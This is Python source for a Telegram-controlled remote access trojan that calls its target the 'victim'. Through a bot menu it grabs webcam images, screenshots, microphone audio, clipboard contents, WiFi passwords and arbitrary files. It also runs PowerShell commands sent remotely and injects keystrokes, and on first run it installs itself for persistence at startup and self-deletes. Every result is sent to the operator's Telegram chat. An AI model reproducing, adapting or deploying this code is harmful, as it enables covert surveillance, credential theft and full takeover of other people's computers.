
import os
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
import telegram
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
import flag
import pyperclip
import subprocess
import sys
import getpass
import requests
import datetime
import config as cfg
from Modules import (
    ip_info,
    webcam_snap,
    screen_shot,
    audio_recorder,
    text_speaker,
    system_info,
    move_mouse,
    get_wifi_password,
    chat,
    show_popup,
    send_key_press,
    wifi_scanner,
    open_website,
    file_mgmt,
    startup,
    task_kill
)


boot_time = datetime.datetime.now()
api_key = cfg.apiKey
chat_id = cfg.chatID

username = getpass.getuser()

application = ApplicationBuilder().token(api_key).build()




def listToString(s):
    str1 = " "
    return str1.join(s)


async def main_menu(update: Update, context):
    keyboard = [
        [InlineKeyboardButton("🔗 https://github.com/infermiere", callback_data="git_hub")],
        [InlineKeyboardButton("📟 Get IP", callback_data="Get_IP")],
        [InlineKeyboardButton("📸 Get Screenshot", callback_data="get_Screenshot")],
        [InlineKeyboardButton("📷 Get Pic From Webcam", callback_data="get_Webcam")],
        [InlineKeyboardButton("👂 Eavesdrop", callback_data="eavesdrop")],
        [InlineKeyboardButton("🗣️ Text To Speech on victim", callback_data="speak")],
        [InlineKeyboardButton("💬 Send Message To Client", callback_data="sendMessage")],
        [
            InlineKeyboardButton(
                "🖥️ Get System Information", callback_data="get_system_info"
            )
        ],
        [
            InlineKeyboardButton(
                "🔑 Perform Shell Commands", callback_data="shell_commands"
            )
        ],
        [
            InlineKeyboardButton(
                "⌛ See the uptime", callback_data="get_upt"
            )
        ],
        [InlineKeyboardButton("🗊 Get Specific File", callback_data="get_file")],
        [InlineKeyboardButton("➡️ Change directory", callback_data="file_cd")],
        [InlineKeyboardButton("🗃️ Show files in folder", callback_data="file_ls")],
        [InlineKeyboardButton("🌐 Open Website", callback_data="open_website")],
        [
            InlineKeyboardButton(
                "🖲️ Move mouse randomly", callback_data="move_mouse"
            )
        ],
        [InlineKeyboardButton("⌨️ Type String", callback_data="type_stringKey")],
        [
            InlineKeyboardButton(
                "⚠️ Show Alert Box with given message", callback_data="show_popup"
            )
        ],
        [
            InlineKeyboardButton(
                "🗓️ Manage processes ", callback_data="tsk_mng"
            )
        ],
        [InlineKeyboardButton("📋 Get Clipboard", callback_data="get_clipboard")],
        [
            InlineKeyboardButton(
                "🗝️ Get Wifi Password", callback_data="get_wifi_password"
            )
        ],
        [
            InlineKeyboardButton(
                "📶 Get Wi-Fi Access Points", callback_data="get_wifi_accesspoints"
            )
        ],
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    msg = await update.message.reply_text("Please choose:", reply_markup=reply_markup)
    await application.bot.pin_chat_message(
    chat_id=msg.chat_id, message_id=msg.message_id
)

async def speak(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    text_speaker.text_speaker(Crt_values)
    await application.bot.send_message(
            chat_id=chat_id, text="Done ✅"
        )

async def cd_dot(update, context):
    await application.bot.send_message(
            chat_id=chat_id, text="Directory Changed To: " + file_mgmt.dir_dot()
        )
    
async def cd_dir(update, context):
    inputs = (update.message.text).split()
    dir = listToString(inputs[1:])
    

    await application.bot.send_message(
            chat_id=chat_id, text=file_mgmt.dir_path(dir)
        )
    
async def file_ls(update, context):
    inputs = (update.message.text).split()
    dir = listToString(inputs[1:])
   
    await application.bot.send_message(
            chat_id=chat_id, text=file_mgmt.dir_ls(dir)
        )

async def uptm(update, context):
    current_time = datetime.datetime.now()
    uptime_duration = current_time - boot_time
    days, remainder = divmod(uptime_duration.total_seconds(), 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = (f"⏲️ Uptime: {int(days)} days, {int(hours)} hours, "
                    f"{int(minutes)} minutes, {int(seconds)} seconds.")
    await application.bot.send_message(
            chat_id=chat_id, text=uptime_str
        )
async def tsk_kill(update, context):
    inputs = (update.message.text).split()
    task = listToString(inputs[1:])
    if len(task) != 0:
        await application.bot.send_message(
            chat_id=chat_id, text=task_kill.ktask(int(task))
                            )
    else:
        ftask = task_kill.ltask()
        await application.bot.send_document(chat_id=chat_id, document=open(ftask, "rb"), caption="List of all open processes.\nTo close a process, run the /ktask <pid> command")
        os.remove(ftask)


async def chat_message(update, context):
    inputs = (update.message.text).split()
    Crt_values = inputs[1:]
    client_message = chat.chat(listToString(Crt_values))
    if client_message:
        await update.message.reply_text(f"Message from {username} : {client_message}")
    else:
        await update.message.reply_text(f"No message from {username}")

async def listen(update: Update, context):
    inputs = (update.message.text).split()

    sec = inputs[1] 
    did = inputs[2] 
    ch = inputs[3] 
    rt = inputs[4]
    try:
        audio_recorder.audio_recorder(int(sec), int(did), int(ch), int(rt))
    except ValueError:
        await application.bot.send_message(
        chat_id=chat_id, text="The args must be INT: for example:\n❌ 48000.0\n✅48000")
        return
    await application.bot.send_audio(
                chat_id=chat_id,
                caption=username + "'s Audio",
                audio=open("audio_record.wav", "rb"),
            )
    os.remove("audio_record.wav")
async def showPopup(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])

    show_popup.show_popup(Crt_values)
    await application.bot.send_message(
            chat_id=chat_id, text="The pop up was shown"
        )

async def type_string(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    send_key_press.send_key_press(Crt_values)
    await application.bot.send_message(
            chat_id=chat_id, text="The string has been written"
        )

async def shell_commands(update, context):
    inputs = (update.message.text).split()
    command = listToString(inputs[1:])
    cmd_output = subprocess.Popen(
        f"powershell.exe {command}", shell=True, stdout=subprocess.PIPE
    )
    try:
        await application.bot.send_message(
            chat_id=chat_id, text=cmd_output.stdout.read().decode(sys.stdout.encoding)
        )
    except telegram.error.BadRequest:
        await application.bot.send_message(
            chat_id=chat_id, text="No output"
        )


async def open_websites(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    open_website.open_website(Crt_values)
    await application.bot.send_message(
            chat_id=chat_id, text="Website opened"
        )

async def get_file(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    await application.bot.send_document(chat_id=chat_id, document=open(Crt_values, "rb"))


async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except telegram.error.BadRequest:
        await update.message.reply_text(f"Do /start")
    result = query.data
    
    if result == "get_Webcam":
        web_ss = webcam_snap.webcam_snap()
        if not web_ss == "Error":
            await application.bot.send_document(
                chat_id=chat_id,
                caption=username + "'s Webcam Snap",
                document=open(web_ss, "rb"),
            )
            os.remove(web_ss)
        else:
            await application.bot.send_message(
            chat_id=chat_id,
            text="I couldn't open a webcam",
        )
    elif result == "get_upt":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To see the uptime, use /uptime",
        )
    elif result == "git_hub":
        await application.bot.send_message(
            chat_id=chat_id,
            text="🔗 https://github.com/infermiere\n💬 @primogirone",
        )
    elif result == "get_system_info":

        sys_info = system_info.system_info()
        await application.bot.send_message(
            chat_id=chat_id,
            text=f"<b>-------🧰 Hardware Info-----</b>\n\n"
            f"📍 System --> {sys_info.get_system()}\n"
            f"📍 Name --> {sys_info.get_system_name()}\n"
            f"📍 Release --> {sys_info.get_system_release()}\n"
            f"📍 Version --> {sys_info.get_system_version()}\n"
            f"📍 Machine --> {sys_info.get_system_machine()}\n"
            f"📍 Processor --> {sys_info.get_system_processor()}\n\n"
            f"<b>-------📁 Memory Info-----</b>\n\n"
            f"📍 Memory Total --> {round(sys_info.mem_total)} GB\n"
            f"📍 Free Memory --> {round(sys_info.mem_free)} GB\n"
            f"📍 Used Memory --> {round(sys_info.mem_used)} GB\n\n"
            f"-------<b>💿 Hard Disk Info-----</b>\n\n"
            f"📍 Total HDD --> {round(sys_info.HDD_total)} GB\n"
            f"📍 Used HDD --> {round(sys_info.HDD_Used)} GB\n"
            f"📍 Free HDD --> {round(sys_info.HDD_Free)} GB\n",
            parse_mode="HTML"            
        )
    elif result == "Get_IP":
        ip_address_info = ip_info.ip_info()
        await application.bot.send_message(
            chat_id=chat_id,
            text="⭕ <b>IP Address :</b> "
            + ip_address_info["query"]
            + "\n⭕ <b>Country :</b> "
            + ip_address_info["country"]
            + " "
            + flag.flag(ip_address_info["countryCode"])
            + "\n⭕ <b> Region : </b>"
            + ip_address_info["regionName"]
            + "\n⭕ <b>City : </b>"
            + ip_address_info["city"], parse_mode="HTML"
        )
    elif result == "get_Screenshot":
        ss = screen_shot.screen_shot()
        await application.bot.send_photo(
            chat_id=chat_id,
            caption=username + "'s Screenshot",
            photo=open(ss, "rb"),
        )
        os.remove(ss)

    elif result == "eavesdrop":
        
        await application.bot.send_message(
            chat_id=chat_id,
            text=audio_recorder.print_audio_devices(), parse_mode="HTML"
        )
        await application.bot.send_message(chat_id=chat_id,
            text="\n\nNow run /listen <seconds> <device id> <channels (use max avaible)> <rates (use max avaible)>")


    elif result == "sendMessage":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To send message to victim, use /s_msg <message>",
        )

    elif result == "shell_commands":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To perform shell commands, use /shell <command>",
        )

    elif result == "open_website":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To open website, use /o_web <website>",
        )

    elif result == "move_mouse":
        await application.bot.send_message(
            chat_id=chat_id,
            text="Moving mouse randomly......",
        )
        move_mouse.move_mouse()
        await application.bot.send_message(chat_id=chat_id, text="✅️ Done!")

    elif result == "tsk_mng":
        await application.bot.send_message(chat_id=chat_id, text="To manage processes, use /ktask")

    elif result == "file_ls":
        await application.bot.send_message(chat_id=chat_id, text="To show files in folder, use /ls")
    
    elif result == "file_cd":
        await application.bot.send_message(chat_id=chat_id, text="To change directory, use /cd <path>")

    elif result == "send_keypress":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To send keypress, use /t_str <string>",
        )

    elif result == "show_popup":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To show alert box, use /s_pop <message>",
        )

    elif result == "get_clipboard":
        await application.bot.send_message(
            chat_id=chat_id, text=f"📋 Clipboard : \n {pyperclip.paste()}"
        )

    elif result == "get_wifi_password":
        wifi_pass = " \n".join(get_wifi_password.get_wifi_password())
        await application.bot.send_message(
            chat_id=chat_id,
            text=wifi_pass,
        )

    elif result == "type_stringKey":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To type string key, use /t_str <string>",
        )

    elif result == "get_wifi_accesspoints":
        access_points = wifi_scanner.wifi_scanner()
        await application.bot.send_message(
            chat_id=chat_id,
            text=access_points
        )

    elif result == "speak":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To speak, use /speak <text>",
        )

    elif result == "get_file":
        await application.bot.send_message(
            chat_id=chat_id,
            text="To send file, use /get_file <file path>",
        )
def send_message(token, chat_id, message):
    
    response = requests.post(f'https://api.telegram.org/bot{token}/sendMessage', json={'chat_id': chat_id,'text': message}, headers={'Content-Type': 'application/json'})
    
    if response.status_code == 200:
        pass
    else:
        pass
def start_bot():
    send_message(api_key, chat_id, "☠️ " + username + " Connected to " + cfg.rat_name + "\n\n🙊/start")

    application.add_handler(CommandHandler("start", main_menu))

    
    application.add_handler(CommandHandler("s_msg", chat_message))
    application.add_handler(CommandHandler("speak", speak))
    application.add_handler(CommandHandler("s_pop", showPopup))
    application.add_handler(CommandHandler("t_str", type_string))
    application.add_handler(CommandHandler("shell", shell_commands))
    application.add_handler(CommandHandler("o_web", open_websites))
    application.add_handler(CommandHandler("get_file", get_file))
    application.add_handler(CommandHandler("listen", listen))
    application.add_handler(CommandHandler("cd_dot", cd_dot))
    application.add_handler(CommandHandler("cd", cd_dir))
    application.add_handler(CommandHandler("ls", file_ls))
    application.add_handler(CommandHandler("ktask", tsk_kill))
    application.add_handler(CommandHandler("uptime", uptm))

    application.add_handler(CallbackQueryHandler(button))
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)
    

def is_first_run():
    flag_file = os.path.join(os.getenv('APPDATA'), f"troll")
    if os.path.exists(flag_file):
        return False
    else:
        with open(flag_file, 'w') as f:
            f.write('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
        return True

def main():
    if is_first_run():
        target_path = startup.copy_to_user_folder()
        if target_path:
            startup.add_to_startup(target_path)
            startup.self_delete_and_run(target_path)
    else:
        start_bot()

main()